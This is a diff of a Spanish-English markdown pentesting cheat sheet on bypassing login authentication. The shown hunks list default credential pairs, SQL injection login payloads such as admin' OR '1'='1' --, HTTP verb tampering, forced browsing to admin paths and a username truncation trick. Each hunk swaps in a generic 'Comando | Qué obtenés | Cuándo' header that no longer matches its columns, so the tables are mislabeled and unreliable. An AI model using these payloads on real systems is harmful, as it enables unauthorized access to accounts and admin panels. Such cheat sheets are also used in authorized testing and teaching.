@@ -22,7 +22,7 @@ linked:
 
 ## Default Credentials
 
-| **Combo** | **Stack típico** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `admin:admin` | Generic | Top guess. |
 | `admin:password` | Generic | Same. |
@@ -68,7 +68,7 @@ ___
 
 ## SQL Injection en Login
 
-| **Payload (username)** | **Payload (password)** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `admin' OR '1'='1' -- ` | `anything` | Classic. |
 | `admin' OR 1=1 -- ` | `anything` | Variant. |
@@ -92,7 +92,7 @@ ___
 
 ## HTTP Verb Tampering
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | GET → POST | If `/admin` checked solo en GET, POST bypasses | Common bug. |
 | POST → GET | Sometimes opposite | Per-config. |
@@ -143,7 +143,7 @@ ___
 
 ## Forced Browsing (Direct Access)
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Direct admin URL | `GET /admin` sin auth | If client-side check only. |
 | Predictable paths | `/admin`, `/admin.php`, `/administrator`, `/manage`, `/dashboard` | Common. |
@@ -167,7 +167,7 @@ ___
 
 ## Truncation Attack
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | DB column has fixed length. App appends spaces / chars then DB truncates → match. | Old attack. |
 | Username truncation | `admin                    x` (con padding spaces) | If DB col VARCHAR(20). |
